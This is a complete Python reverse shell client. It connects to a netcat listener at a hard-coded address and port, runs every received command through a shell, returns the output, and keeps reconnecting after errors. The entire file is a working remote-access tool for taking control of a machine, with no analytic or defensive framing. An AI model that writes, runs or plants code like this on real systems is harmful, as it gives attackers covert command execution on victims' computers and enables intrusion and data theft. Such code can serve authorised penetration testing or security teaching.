import subprocess
import socket
import os
import time

def main():
    try: 
        server_ip = '192.168.1.13' # netcat listener ip 
        server_port = 8888 # netcat listener port

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        os.chdir('/')  # Change to the root directory

        while True:
            try:
                command = client.recv(4096).decode()

                if command.strip().lower() == "exit":
                    break

                if command.startswith("cd "):
                    # Change directory command support
                    directory = command.split("cd ")[1].strip()
                    try:
                        os.chdir(directory)
                        output = f"Changed directory to {os.getcwd()}\n".encode()
                    except Exception as e:
                        output = str(e).encode()
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                output += (f"{os.getcwd()}> ".encode())
                client.sendall(bytes(output))  # Send encoded output
            except Exception as e:
                client.close()
                time.sleep(5) 
                main() # reconnect after error
    except Exception as e:
        time.sleep(5)
        main() # try reconnectiong again


if __name__ == '__main__':
    main()
